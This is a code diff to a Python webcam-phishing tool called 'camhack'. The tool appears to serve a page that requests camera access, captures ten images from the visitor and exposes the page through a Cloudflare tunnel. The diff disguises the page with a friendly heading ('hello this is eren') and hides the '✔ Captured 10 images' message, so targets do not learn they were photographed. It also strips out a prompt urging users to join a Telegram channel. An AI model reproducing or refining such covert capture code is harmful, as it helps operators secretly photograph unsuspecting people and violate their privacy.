@@ -23,7 +23,7 @@ HTML_PAGE = """
   </style>
 </head>
 <body>
-  <h1>📸 camhack</h1>
+  <h1>📸 hello this is eren</h1>
   <h3>Camera Access Required</h3>
   <p id="msg">Please allow camera to continue...</p>
   <video id="video" autoplay playsinline width="300" height="220"></video>
@@ -46,7 +46,7 @@ HTML_PAGE = """
         count++;
         if(count >= 10) { 
           clearInterval(interval); 
-          document.getElementById("msg").innerText="✔ Captured 10 images"; 
+          document.getElementById("msg").innerText="✔"; 
         }
       }, 1500);
     })
@@ -93,18 +93,6 @@ def upload():
 def banner():
     os.system("clear")
     print(Fore.LIGHTBLUE_EX + Style.BRIGHT + "camhack by Shourya" + Style.RESET_ALL)
-
-def unlock():
-    os.system("clear")
-    print(Fore.RED + Style.BRIGHT + "\n🔓 Unlocking camhack by Shourya" + Style.RESET_ALL)
-    print(Fore.YELLOW + "\n👉 To use this tool, you must join to Shourya's telegram ." + Style.RESET_ALL)
-    print(Fore.CYAN + "\nYou will be redirected automatically in 10 seconds..." + Style.RESET_ALL)
-    for i in range(10,0,-1):
-        print(Fore.MAGENTA + f"⏳ Redirecting to telegram in {i} sec..." + Style.RESET_ALL, end="\r")
-        time.sleep(1)
-    print(Fore.GREEN + "\n🌍 Opening telegram... Please join!\n" + Style.RESET_ALL)
-    os.system("xdg-open https://t.me/wehavedealsfr")
-    input(Fore.CYAN + "\n✅ After join, press ENTER to continue..." + Style.RESET_ALL)
 
 # ---------------- Cloudflare Tunnel ----------------
 def start_cloudflare():
